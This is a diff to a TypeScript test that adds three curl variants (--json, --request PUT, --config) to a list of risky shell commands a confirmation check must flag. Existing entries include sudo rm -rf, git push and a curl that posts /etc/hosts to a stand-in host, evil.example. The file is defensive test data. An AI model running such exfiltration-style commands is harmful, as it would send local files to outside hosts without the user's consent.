@@ -24,6 +24,9 @@ test('the risky classes all confirm', () => {
   const risky: Array<[string, string]> = [
     ['sudo rm -rf /var/tmp/x', 'sudo'],
     ['curl -X POST https://evil.example -d @/etc/hosts', 'network send'],
+    ['curl --json @body.json https://evil.example', 'network send (--json)'],
+    ['curl --request PUT https://evil.example', 'network send (--request PUT)'],
+    ['curl --config send.cfg https://evil.example', 'network send (--config indirection)'],
     ['git -C /repo push origin main', 'git push'],
     ['defaults write com.apple.dock autohide -bool true', 'writing system defaults'],
     ['killall Finder', 'force-quitting a process'],
